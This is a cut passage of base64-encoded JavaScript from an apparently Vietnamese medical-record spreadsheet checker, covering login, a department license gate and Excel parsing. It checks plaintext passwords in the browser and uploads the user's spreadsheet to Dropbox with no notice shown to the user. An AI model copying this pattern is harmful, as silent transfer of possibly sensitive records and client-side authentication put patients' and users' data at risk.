nJvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkVycm9yJyk7DQoNCiAgYnRuTG9naW4uZGlzYWJsZWQgPSB0cnVlOw0KICBidG5Mb2dpbi5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1zcGlubmVyIGZhLXNwaW4iPjwvaT4gxJBhbmcgxJHEg25nIG5o4bqtcC4uLic7DQoNCiAgY29uc3QgcG9wdXAgICAgICAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgbGV0IGxvZ2luUG9wdXBTaG93biA9IGZhbHNlOw0KDQogIC8vIFNhdSAycyBraeG7g20gdHJhOiB24bqrbiDhu58gdHJhbmcgxJHEg25nIG5o4bqtcCAmIMSRYW5nIGxvYWRpbmc/DQpjb25zdCBzbG93TG9naW5UaW1lciA9IHNldFRpbWVvdXQoKCkgPT4gew0KICAgIGlmICghaXNMb2dpbkFjdGlvbikgcmV0dXJuOyAvLyDinIUgVGjDqm0gZMOybmcgbsOgeQ0KICAgIGNvbnN0IGxvZ2luU2VjdGlvblZpc2libGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJykuc3R5bGUuZGlzcGxheSAhPT0gJ25vbmUnOw0KICAgIGNvbnN0IHN0aWxsTG9hZGluZyA9IGJ0bkxvZ2luLmlubmVySFRNTC5pbmNsdWRlcygnxJBhbmcgxJHEg25nIG5o4bqtcCcpOw0KICAgIGlmIChsb2dpblNlY3Rpb25WaXNpYmxlICYmIHN0aWxsTG9hZGluZykgew0KICAgICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gYA0KICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLXNhdGVsbGl0ZS1kaXNoIGZhLXNwaW4iIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjojZTY3ZTIyO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPg0KICAgICAgICA8c3Ryb25nPsSQxrDhu51uZyB0cnV54buBbiBnacOhbiDEkW/huqFuPC9zdHJvbmc+PGJyLz48YnIvPg0KICAgICAgICBWdWkgbMOybmcgxJHhu6NpIHbDoGkgZ2nDonkgxJHhu4Mga2jhu59pIMSR4buZbmcgbcOheSBjaOG7pyBk4buxIHBow7JuZy4uLg0KICAgICAgYDsNCiAgICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzAlJzsNCiAgICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpKTsNCiAgICAgIGxvZ2luUG9wdXBTaG93biA9IHRydWU7DQogICAgbGV0IHBlcmNlbnQgPSAwOw0KcHJvZ3Jlc3NCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICd3aWR0aCAwLjJzIGxpbmVhcic7DQpjb25zdCBwcm9ncmVzc1RpbWVyID0gc2V0SW50ZXJ2YWwoKCkgPT4gew0KICAgIHBlcmNlbnQgKz0gMjsgLy8gdMSDbmcgbeG7l2kgbOG6p24gMiUNCiAgICBpZiAocGVyY2VudCA+IDEwMCkgew0KICAgICAgICBwZXJjZW50ID0gMTAwOw0KICAgICAgICBjbGVhckludGVydmFsKHByb2dyZXNzVGltZXIpOw0KICAgIH0NCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9IHBlcmNlbnQgKyAnJSc7DQp9LCA1MDApOyAvLyAxMDBtcyBj4bqtcCBuaOG6rXQgMSBs4bqnbg0KDQoJDQoJfQ0KICB9LCAyMDAwKTsNCg0KICB0cnkgew0KICAgIGNvbnN0IGFjY291bnRzID0gYXdhaXQgbG9hZEFjY291bnRzRnJvbVRYVCgpOw0KICAgIGlmIChhY2NvdW50c1t1c2VybmFtZV0gJiYgYWNjb3VudHNbdXNlcm5hbWVdID09PSBwYXNzd29yZCkgew0KICAgICAgY3VycmVudFVzZXIgPSB1c2VybmFtZTsNCiAgICAgIHNlc3Npb25TdG9yYWdlLnNldEl0ZW0oJ21lZFVzZXInLCB1c2VybmFtZSk7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWluQ29udGVudCcpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgbG9naW5FcnJvci5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QucmVtb3ZlKCdsb2dpbi1wYWdlJyk7DQoNCiAgICAgIGF3YWl0IGluaXRBZnRlckxvZ2luKCk7IC8vIGNo4buJIGxvYWQgc2F1IGtoaSBsb2dpbiB0aMOgbmggY8O0bmcNCiAgICB9IGVsc2Ugew0KICAgICAgbG9naW5FcnJvci5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICB9DQogIH0gY2F0Y2ggKGVycikgew0KICAgIGNvbnNvbGUuZXJyb3IoJ0zhu5dpIGtoaSDEkcSDbmcgbmjhuq1wOicsIGVycik7DQogICAgbG9naW5FcnJvci5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgfSBmaW5hbGx5IHsNCiAgICBjbGVhclRpbWVvdXQoc2xvd0xvZ2luVGltZXIpOw0KDQogICAgLy8gTuG6v3UgcG9wdXAgZG8gbG9naW4gbeG7nyB0aMOsIMSRw7NuZw0KICAgIGlmIChsb2dpblBvcHVwU2hvd24gJiYgcG9wdXApIHsNCiAgICAgIHBvcHVwLmNsYXNzTGlzdC5yZW1vdmUoJ3Nob3cnKTsNCiAgICAgIHNldFRpbWVvdXQoKCkgPT4geyBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyB9LCA0MDApOw0KICAgIH0NCg0KICAgIGJ0bkxvZ2luLmRpc2FibGVkID0gZmFsc2U7DQogICAgYnRuTG9naW4uaW5uZXJIVE1MID0gJ8SQxINuZyBuaOG6rXAnOw0KICB9DQp9DQoNCg0KICAgICAgICBmdW5jdGlvbiBsb2dvdXQoKSB7DQogICAgICAgICAgICBjdXJyZW50VXNlciA9IG51bGw7DQogICAgICAgICAgICBzZXNzaW9uU3RvcmFnZS5yZW1vdmVJdGVtKCdtZWRVc2VyJyk7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFpbkNvbnRlbnQnKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJuYW1lSW5wdXQnKS52YWx1ZSA9ICcnOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS52YWx1ZSA9ICcnOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luRXJyb3InKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QuYWRkKCdsb2dpbi1wYWdlJyk7DQogICAgICAgIH0NCg0KLy8gPT09PT09PT09PSBIw4BNIExPQUQgREFOSCBTw4FDSCBLSE9BIEjhu6JQIEzhu4YgPT09PT09PT09PSAvLw0KYXN5bmMgZnVuY3Rpb24gbG9hZFZhbGlkRGVwYXJ0bWVudHMoKSB7DQogICAgY29uc3QgdXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi9raG9hLnR4dCc7DQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2godXJsKTsNCiAgICAgICAgY29uc3QgdGV4dCA9IGF3YWl0IHJlcy50ZXh0KCk7DQogICAgICAgIGNvbnN0IGtob2FMaXN0ID0gdGV4dC5zcGxpdCgnXG4nKS5tYXAobGluZSA9PiBsaW5lLnRyaW0oKS50b0xvd2VyQ2FzZSgpKS5maWx0ZXIoQm9vbGVhbik7DQogICAgICAgIHJldHVybiBraG9hTGlzdDsNCiAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgY29uc29sZS5lcnJvcigiS2jDtG5nIHRo4buDIHThuqNpIGRhbmggc8OhY2gga2hvYToiLCBlcnIpOw0KICAgICAgICByZXR1cm4gW107DQogICAgfQ0KfQ0KDQogICAgICAgIC8vID09PT09PT09PT0gUEjhuqZOIFjhu6wgTMOdIEZJTEUgPT09PT09PT09PSAvLw0KZnVuY3Rpb24gaGFuZGxlRmlsZSgpIHsNCiAgICBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7DQogICAgY29uc3QgYW5hbHl6ZUJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhbmFseXplQnRuJyk7DQogICAgY29uc3QgZmlsZSA9IGZpbGVJbnB1dC5maWxlc1swXTsNCgkNCmlmICghZmlsZSkgew0KICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXInKTsNCg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOnJlZDttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgPHN0cm9uZz5WdWkgbMOybmcgY2jhu41uIGZpbGUgdHLGsOG7m2Mga2hpIGtp4buDbSB0cmE8L3N0cm9uZz48YnIvPjxici8+DQogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpLnN0eWxlLmRpc3BsYXk9J25vbmUnIj7EkMOzbmc8L2J1dHRvbj4NCiAgICBgOw0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzAlJzsNCiAgICANCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCiAgICByZXR1cm47DQp9DQoNCg0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlUmVxdWlyZW1lbnRzJykuY2xhc3NMaXN0LmFkZCgnaGlkZGVuJyk7DQogICAgZXJyb3JMb2cgPSBbXTsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0U2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgYW5hbHl6ZUJ0bi5kaXNhYmxlZCA9IHRydWU7DQogICAgYW5hbHl6ZUJ0bi5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1zcGlubmVyIGZhLXNwaW4iPjwvaT4gxJBhbmcga2nhu4NtIHRyYS4uLic7DQogICAgLy8g4pyFIELhuq90IMSR4bqndSDEkeG6v20gMnMgxJHhu4MgaGnhu4duIHBvcHVwIG7hur91IHbhuqtuIMSRYW5nICLEkGFuZyBraeG7g20gdHJhLi4uIg0KY2xlYXJUaW1lb3V0KGFuYWx5emVQb3B1cFRpbWVyKTsNCmFuYWx5emVQb3B1cFRpbWVyID0gc2V0VGltZW91dCgoKSA9PiB7DQogICAgY29uc3QgYnRuQW5hbHl6ZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhbmFseXplQnRuJyk7DQogICAgaWYgKGJ0bkFuYWx5emUuaW5uZXJIVE1MLmluY2x1ZGVzKCfEkGFuZyBraeG7g20gdHJhJykpIHsNCiAgICAgICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogICAgICAgIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogICAgICAgIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgICAgICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1zYXRlbGxpdGUtZGlzaCBpY29uLXNwaW4iIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjojZTY3ZTIyO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPg0KICAgICAgICAgICAgPHN0cm9uZz7EkMaw4budbmcgdHJ1eeG7gW4gZ2nDoW4gxJFv4bqhbjwvc3Ryb25nPjxici8+DQogICAgICAgICAgICBWdWkgbMOybmcgxJHhu6NpIHbDoGkgZ2nDonkgxJHhu4Mga2jhu59pIMSR4buZbmcgbcOheSBjaOG7pyBk4buxIHBow7JuZy4uLg0KICAgICAgICBgOw0KICAgICAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQogICAgICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgICAgIHJlcXVlc3RBbmltYXRpb25GcmFtZSgoKSA9PiBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93JykpOw0KDQogICAgICAgIC8vIENo4bqheSBwcm9ncmVzc0JhciAlDQogICAgICAgIGxldCBwZXJjZW50ID0gMDsNCiAgICAgICAgcHJvZ3Jlc3NCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICd3aWR0aCAwLjJzIGxpbmVhcic7DQogICAgICAgIGNvbnN0IHByb2dyZXNzVGltZXIgPSBzZXRJbnRlcnZhbCgoKSA9PiB7DQogICAgICAgICAgICBwZXJjZW50ICs9IDI7DQogICAgICAgICAgICBpZiAocGVyY2VudCA+IDEwMCkgew0KICAgICAgICAgICAgICAgIHBlcmNlbnQgPSAxMDA7DQogICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChwcm9ncmVzc1RpbWVyKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gcGVyY2VudCArICclJzsNCiAgICAgICAgfSwgMTAwKTsNCiAgICB9DQp9LCA1MDAwKTsNCg0KICAgIGNvbnN0IHJlYWRlciA9IG5ldyBGaWxlUmVhZGVyKCk7DQogICAgDQogICAgcmVhZGVyLm9ubG9hZCA9IGFzeW5jIGZ1bmN0aW9uKGUpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGNvbnN0IGRhdGEgPSBuZXcgVWludDhBcnJheShlLnRhcmdldC5yZXN1bHQpOw0KICAgICAgICAgICAgY29uc3Qgd29ya2Jvb2sgPSBYTFNYLnJlYWQoZGF0YSwgeyB0eXBlOiAnYXJyYXknIH0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAod29ya2Jvb2suU2hlZXROYW1lcy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0ZpbGUgRXhjZWwga2jDtG5nIGPDsyBzaGVldCBuw6BvJyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IGZpcnN0U2hlZXQgPSB3b3JrYm9vay5TaGVldHNbd29ya2Jvb2suU2hlZXROYW1lc1sxXV07DQogICAgICAgICAgICBjb25zdCBqc29uRGF0YSA9IFhMU1gudXRpbHMuc2hlZXRfdG9fanNvbihmaXJzdFNoZWV0LCB7IA0KICAgICAgICAgICAgICAgIGhlYWRlcjogMSwgDQogICAgICAgICAgICAgICAgZGVmdmFsOiAiIiwgDQogICAgICAgICAgICAgICAgYmxhbmtyb3dzOiB0cnVlIA0KICAgICAgICAgICAgfSk7DQogICAgICAgICAgICBjb25zdCBkb25nNSA9IChqc29uRGF0YVs0XSAmJiBqc29uRGF0YVs0XVswXSkgPyBqc29uRGF0YVs0XVswXS50b1N0cmluZygpLnRyaW0oKSA6ICJLaMO0bmcgcsO1IjsNCmNvbnN0IGRvbmc2ID0gKGpzb25EYXRhWzVdICYmIGpzb25EYXRhWzVdWzBdKSA/IGpzb25EYXRhWzVdWzBdLnRvU3RyaW5nKCkudHJpbSgpIDogIktow7RuZyByw7UiOw0Kd2luZG93Lm5nYXlWYWx1ZSA9IGRvbmc1OyAgLy8g4qyFIGTDsm5nIDUgPSBOZ8OgeQ0Kd2luZG93Lmtob2FWYWx1ZSA9IGRvbmc2OyAgLy8g4qyFIGTDsm5nIDYgPSBLaG9hDQoNCg0KCQkJLy8vLyBLaeG7g20gdHJhIGtob2EgLy8vLy8NCi8vIOKchSBM4bqleSBk4buvIGxp4buHdSBkw7JuZyA2LCBj4buZdCBBDQpjb25zdCBraG9hUm93ID0ganNvbkRhdGFbNV07IC8vIGTDsm5nIDYNCmNvbnN0IGtob2FUZXh0ID0gKGtob2FSb3cgJiYga2hvYVJvd1swXSB8fCAiIikudG9TdHJpbmcoKS50cmltKCk7DQpjb25zdCBraG9hTG93ZXIgPSBraG9hVGV4dC50b0xvd2VyQ2FzZSgpOw0KDQovLyDinIUgS2nhu4NtIHRyYSB0w6puIGtob2ENCmNvbnN0IHZhbGlkS2hvYUxpc3QgPSBhd2FpdCBsb2FkVmFsaWREZXBhcnRtZW50cygpOw0KaWYgKCF2YWxpZEtob2FMaXN0LnNvbWUoa2hvYSA9PiBraG9hTG93ZXIuaW5jbHVkZXMoa2hvYSkpKSB7DQogICAgICB3aW5kb3cuaXNLaG9hTG9pID0gdHJ1ZTsNCiAgICBjb25zdCBtc2cgPSBg4p2MIE3DoXkgY2jhu6cgdOG7qyBjaOG7kWkgJHtraG9hVGV4dCB8fCAnS2jDtG5nIHjDoWMgxJHhu4tuaCd9IHPhu60gZOG7pW5nIHBo4bqnbiBt4buBbS4gPGJyLz5WdWkgbMOybmcgbXVhIGLhuqNuIHF1eeG7gW4gxJHhu4MgdMO0biB0cuG7jW5nIHTDoWMgZ2nhuqMuIGA7DQoNCiAgICAvLyBIaeG7g24gcG9wdXAgY2jhu6kga2jDtG5nIGFsZXJ0DQogLy8gSGnhu4NuIHRo4buLIHBvcHVwDQogICAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKTsNCiAgICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICAgIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgICAvLyBIaeG7g24gdGjhu4sgdGjDtG5nIGLDoW8gbOG7l2kgdsSpbmggdmnhu4VuDQogICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSBgDQogICAgPGkgY2xhc3M9ImZhcyBmYS1iYW4iIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjpyZWQ7Zm9udC1zaXplOjIwcHg7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgPHN0cm9uZz4ke21zZ308L3N0cm9uZz48YnIvPjxici8+DQogICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0iYnV5TGljZW5zZSI+TXVhIELhuqNuIFF1eeG7gW48L2J1dHRvbj48YnIvPjxici8+DQogICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJ3aW5kb3cubG9jYXRpb24ucmVsb2FkKCkiPsSQw7NuZzwvYnV0dG9uPg0KYDsNCg0KLy8gU2F1IGtoaSByZW5kZXIgbsO6dCwgdGjDqm0gc+G7sSBraeG7h24NCnNldFRpbWVvdXQoKCkgPT4gew0KICBjb25zdCBidG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnV5TGljZW5zZSIpOw0KICBpZiAoYnRuKSB7DQogICAgYnRuLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgKCkgPT4gew0KICAgICAgLy8g4bqobiBwb3B1cCBs4buXaQ0KICAgICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibG9hZGluZ1BvcHVwIik7DQogICAgICBpZiAocG9wdXApIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgICAvLyBN4bufIHBvcHVwIGLhuqNuZyBnacOhDQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnV5UG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOw0KICAgIH0pOw0KICB9DQp9LCAyMDApOw0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzAlJzsNCg0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpOw0KDQogICAgLy8g4pyFIFbDlCBISeG7hlUgSMOTQSBi4bqldCBr4buzIMSRb+G6oW4gbsOgbyBj4buRIGfhuq9uZyDhuqluIHBvcHVwIHNhdSDEkcOzDQogICAgd2luZG93LmlzS2hvYUxvaSA9IHRydWU7DQoNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2NhblN0YXR1cycpLmlubmVySFRNTCA9IGA8c3BhbiBzdHlsZT0iY29sb3I6cmVkO2ZvbnQtd2VpZ2h0OmJvbGQiPiR7bXNnfTwvc3Bhbj5gOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRTZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JTZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICByZXR1cm47DQp9DQoNCg0KDQoJCQkNCiAgICAgICAgICAgIGlmIChqc29uRGF0YS5sZW5ndGggPD0gMSkgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcignRmlsZSBFeGNlbCBraMO0bmcgY8OzIGThu68gbGnhu4d1IChjaOG7iSBjw7MgdGnDqnUgxJHhu4EgaG/hurdjIHRy4buRbmcpJyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgcHJvY2Vzc0RhdGEoanNvbkRhdGEpOw0KICAgICAgICAgIGNvbnN0IHN0YXRzID0gew0KICAgICAgICAgICAgaGVyYjogZ2V0SGVyYk91dGxpZXJUb3RhbCgpLA0KICAgICAgICAgICAgICB0aW1lOiBnZXRUaW1lRXJyb3JUb3RhbCgpLA0KICAgICAgICAgICAgIGNvbmZsaWN0OiBnZXRDb25mbGljdFRvdGFsKCkNCiAgICAgICAgICB9Ow0KICAgICAgICAgIGNvbnN0IHVwbG9hZEZpbGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0JykuZmlsZXNbMF07DQogYXdhaXQgdXBsb2FkVG9Ecm9wYm94KHVwbG9hZEZpbGUsIHdpbmRvdy5raG9hVmFsdWUsIHdpbmRvdy5uZ2F5VmFsdWUsIHN0YXRzKTsNCiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlUmVxdWlyZW1lbnRzJykuY2xhc3NMaXN0LnJlbW92ZSgnaGlkZGVuJyk7DQogICAgICAgICAgICBsb2dFcnJvcignTOG7l2kga2hpIMSR4buNYyBmaWxlIEV4Y2VsJywgbnVsbCwgZXJyb3IubWVzc2FnZSk7DQogICAgICAgICAgICBkaXNwbGF5RXJyb3JzKCk7DQogICAgICAgICAgICBhbGVydCgnQ8OzIGzhu5dpIHjhuqN5IHJhIGtoaSDEkeG7jWMgZmlsZTogJyArIGVycm9yLm1lc3NhZ2UpOw0KICAgICAgICB9IGZpbmFsbHkgew0KCQljbGVhclRpbWVvdXQoYW5hbHl6ZVBvcHVwVGltZXIpOyAvLyDinIUgTmfhuq90IHRpbWVyIHBvcHVwDQoJCWlmICghd2luZG93LmlzS2hvYUxvaSkgeyAgDQoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKS5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyk7IC8vIOKchSDhuqhuIHBvcHVwDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7ICAgLy8g4pyFIOG6qG4gaOG6s24gcG9wdXANCgkgIH0NCiAgICAgICAgICAgIGFuYWx5emVCdG4uZGlzYWJsZWQgPSBmYWxzZTsNCiAgICAgICAgICAgIGFuYWx5emVCdG4uaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtc2VhcmNoIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBLaeG7g20gVHJhJzsNCiAgICAgICAgfQ0KICAgIH07DQogICAgDQogICAgcmVhZGVyLm9uZXJyb3IgPSBmdW5jdGlvbigpIHsNCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVSZXF1aXJlbWVudHMnKS5jbGFzc0xpc3QucmVtb3ZlKCdoaWRkZW4nKTsNCiAgICAgICAgbG9nRXJyb3IoJ0zhu5dpIGtoaSDEkeG7jWMgZmlsZScsIG51bGwsICdLaMO0bmcgdGjhu4MgxJHhu41jIG7hu5lpIGR1bmcgZmlsZScpOw0KICAgICAgICBkaXNwbGF5RXJyb3JzKCk7DQogICAgICAgIGFuYWx5emVCdG4uZGlzYWJsZWQgPSBmYWxzZTsNCiAgICAgICAgYW5hbHl6ZUJ0bi5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1zZWFyY2ggZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEtp4buDbSBUcmEnOw0KICAgICAgICBhbGVydCgnTOG7l2kga2hpIMSR4buNYyBmaWxlLiBWdWkgbMOybmcgdGjhu60gbOG6oWkgduG7m2kgZmlsZSBraMOhYy4nKTsNCiAgICB9Ow0KICAgIA0KICAgIHJlYWRlci5yZWFkQXNBcnJheUJ1ZmZlcihmaWxlKTsNCn0NCg0KICAgICAgICBmdW5jdGlvbiBwcm9jZXNzRGF0YShkYXRhKSB7DQogICAgDQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgaGVhZGVyTGluZTEgPSBkYXRhWzddIHx8IFtdOw0KICAgICAgICBjb25zdCBoZWFkZXJMaW5lMiA9IGRhdGFbOF0gfHwgW107DQogICAgICAgIGNvbnN0IGNvbWJpbmVkSGVhZGVycyA9IGhlYWRlckxpbmUxLm1hcCgoY29sLCBpbmRleCkgPT4gDQogICAgICAgICAgICAoY29sICsgJyAnICsgKGhlYWRlckxpbmUyW2luZGV4XSB8fCAnJykpLnRyaW0oKQ0KICAgICAgICApOw0KDQogICAgICAgIA0KICAgICAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bunIHRodeG6rXQiKSk7DQoJCQkJY29uc3QgZGF0ZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIk5nw6B5IHRo4buxYyBoaeG7h24iKSk7IC8vIFRow6ptIGTDsm5nIG7DoHkNCiAgICAgICAgICAgICAgICBjb25zdCBzdGFydEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IGVuZEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bu